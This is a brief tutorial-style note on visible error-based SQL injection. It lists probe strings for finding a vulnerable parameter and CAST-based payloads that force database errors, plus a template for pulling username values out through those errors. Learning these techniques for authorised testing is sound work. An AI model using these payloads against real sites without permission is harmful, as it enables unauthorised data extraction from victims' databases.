
## Visible Error Based SQLi

- Visible Error Based SQLi is basically when you inject a payload and that causes the database to raise an error and return the error message.
- We need to trigger visible errors so that we can inject our custom payloads and trigger database error and get useful information returned to us through the error message.


### 1. Checking Parameter Vulnerability

```sql
'
'--

/*
If one payload causes error and another doesn't it means that parameter is vulnerable to sqli. You need to find which parameter is vulnerable first.
you need to have a basic idea of what the original query is.
*/
```

### 2. Testing Error Entries 

```sql
' AND CAST((SELECT 1) AS int)--
/*
the first payload is for error testing.
this doesnt have a proper boolean expression so it will most likely fail.
But the database will print the error message.
*/
 
' AND 1=CAST((SELECT 1) AS int)--
/*
the second payload fixes the boolean expression so
it will most likely not throw an error. This is for testing the visible error sqli.
if this payload works the further payloads are going to build up on this one.
*/
```

### 3. Checking Usernames

```sql
' AND CAST((SELECT <username column> FROM <table_name>) AS int)
```